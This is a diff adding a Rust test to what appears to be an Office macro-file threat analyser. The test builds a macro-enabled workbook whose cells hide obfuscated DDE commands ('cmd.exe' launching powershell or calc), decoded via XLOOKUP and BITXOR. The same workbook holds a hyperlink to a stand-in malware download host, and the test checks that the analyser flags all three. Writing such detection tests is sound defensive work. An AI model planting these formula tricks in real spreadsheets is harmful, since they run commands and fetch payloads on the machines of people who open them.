@@ -2665,3 +2665,81 @@ fn e2e_indirect_offset_address_and_concat_cell_threat_deobfuscation() {
         "F1 should resolve cross-sheet hyperlink via INDIRECT: {threats:?}"
     );
 }
+
+#[test]
+fn e2e_bitwise_xlookup_and_text_threat_deobfuscation() {
+    let src = "Sub CleanProc()\nEnd Sub\n";
+    let line0 = build_func_defn(0);
+    let pcode = synthesize_pcode_line_map(&[&line0]);
+    let cfb = synthesize_cfb_project(
+        "BitwiseXlookupProj",
+        &[("ThisWorkbook", src, &pcode)],
+        &["CleanProc"],
+    );
+
+    let content_types = "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/><Default Extension=\"xml\" ContentType=\"application/xml\"/><Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.ms-excel.sheet.macroEnabled.main+xml\"/><Override PartName=\"/xl/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/><Override PartName=\"/xl/worksheets/sheet1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/></Types>";
+    let pkg_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/></Relationships>";
+    let wb = "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheets><sheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId2\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"/></sheets></workbook>";
+    let wb_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
+        <Relationship Id=\"rId1\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/>\
+        <Relationship Id=\"rId2\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet1.xml\"/>\
+    </Relationships>";
+
+    let sheet1 = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData>\
+        <row r=\"1\">\
+            <c r=\"A1\" t=\"inlineStr\"><is><t>target_cmd</t></is></c>\
+            <c r=\"B1\" t=\"inlineStr\"><is><t>cmd.exe</t></is></c>\
+        </row>\
+        <row r=\"2\">\
+            <c r=\"A2\" t=\"inlineStr\"><is><t>target_arg</t></is></c>\
+            <c r=\"B2\" t=\"inlineStr\"><is><t>|'/c powershell'</t></is></c>\
+        </row>\
+        <row r=\"3\">\
+            <c r=\"A3\" t=\"inlineStr\"><is><t>target_url</t></is></c>\
+            <c r=\"B3\" t=\"inlineStr\"><is><t>PREFIX:https://malware.example.com/trojan.exe:SUFFIX</t></is></c>\
+        </row>\
+        <row r=\"4\">\
+            <c r=\"C1\"><f>=XLOOKUP(&quot;target_cmd&quot;, A1:A2, B1:B2) &amp; XLOOKUP(&quot;target_arg&quot;, A1:A2, B1:B2) &amp; &quot;!A0&quot;</f></c>\
+            <c r=\"D1\"><f>=HYPERLINK(TEXTBEFORE(TEXTAFTER(XLOOKUP(&quot;target_url&quot;, A1:A3, B1:B3), &quot;PREFIX:&quot;), &quot;:SUFFIX&quot;), &quot;Click&quot;)</f></c>\
+            <c r=\"E1\"><f>=CHAR(BITXOR(73, 42)) &amp; CHAR(BITXOR(71, 42)) &amp; CHAR(BITXOR(78, 42)) &amp; &quot;.exe|'/c calc'!A0&quot;</f></c>\
+        </row>\
+    </sheetData></worksheet>";
+
+    let xlsm = synthesize_zip(&[
+        ("[Content_Types].xml", content_types.as_bytes()),
+        ("_rels/.rels", pkg_rels.as_bytes()),
+        ("xl/workbook.xml", wb.as_bytes()),
+        ("xl/_rels/workbook.xml.rels", wb_rels.as_bytes()),
+        ("xl/vbaProject.bin", &cfb),
+        ("xl/worksheets/sheet1.xml", sheet1.as_bytes()),
+    ]);
+
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");
+    let threats = &inspection.extracted.cell_threats;
+
+    // Verify C1: DDE resolved via XLOOKUP
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "C1"
+            && t.threat_kind == "DDE"
+            && t.description.contains("cmd.exe|'/c powershell'!A0")),
+        "C1 should resolve DDE via XLOOKUP: {threats:?}"
+    );
+
+    // Verify D1: Suspicious Hyperlink resolved via XLOOKUP + TEXTBEFORE + TEXTAFTER
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "D1"
+            && t.threat_kind == "SuspiciousHyperlink"
+            && t.description
+                .contains("https://malware.example.com/trojan.exe")),
+        "D1 should resolve download URL via XLOOKUP + TEXTBEFORE + TEXTAFTER: {threats:?}"
+    );
+
+    // Verify E1: DDE resolved via BITXOR character decryption
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "E1"
+            && t.threat_kind == "DDE"
+            && t.description.contains("cmd.exe|'/c calc'!A0")),
+        "E1 should resolve DDE via BITXOR decryption: {threats:?}"
+    );
+}
